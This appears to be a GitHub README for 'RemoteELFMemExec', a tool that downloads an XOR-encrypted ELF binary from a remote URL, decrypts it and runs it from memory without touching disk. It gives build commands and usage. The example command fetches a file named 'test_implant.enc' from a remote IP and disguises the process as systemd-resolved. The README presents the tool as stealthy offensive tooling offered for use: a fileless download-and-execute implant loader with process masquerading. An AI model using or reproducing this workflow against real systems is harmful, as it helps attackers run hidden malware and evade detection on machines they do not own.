
# RemoteELFMemExec

**RemoteELFMemExec** is a tool designed to download, decrypt, and execute ELF binaries directly in memory from a remote URL. This utility enables the execution of executable files without writing them to disk, leveraging memory-based execution for enhanced stealth and efficiency. The tool uses XOR encryption to securely decrypt the ELF binary before execution.


> **⚠️ Warning:** On legacy systems, such as CentOS 6, it is not possible to execute ELF files directly in memory due to the lack of support for the `memfd_create` function, introduced in Linux 3.17. In these environments, the process downloads the encrypted ELF file to disk, decrypts it, executes it, and then deletes it.



## Compilation

### Requirements

Before compiling, ensure you have the following packages installed:

- `gcc`
- `make`
- `libcurl4-openssl-dev`


### Debug Mode
```bash

make

```
**⚠️ Warning:** To enable static compilation, you must compile `lcurl` as a static library.
### Static Compilation
```bash

make  static

```
### Legacy Systems
```bash

make  legacy

```
### Static Compilation for Legacy Systems
```bash

make  legacy_static

```
## Usage
```bash

./elfMemExecutor  <Url>  <Key>  <Alias_process>

```
## Example
```bash

./elfMemExecutor  http://192.168.1.190/test_implant.enc  0331afffba74a654b4e8  "/lib/systemd/systemd-resolved"

```
### Example Debug Mode
![image](https://github.com/user-attachments/assets/2d24acdb-6623-438e-904d-55094cf02396)


### Example Static 
![image](https://github.com/user-attachments/assets/6991bee4-2f0e-4d95-8812-7ee810b4afaa)

### Example Legacy 
![image](https://github.com/user-attachments/assets/905d9cad-0181-4b85-b83f-401228839c6c)

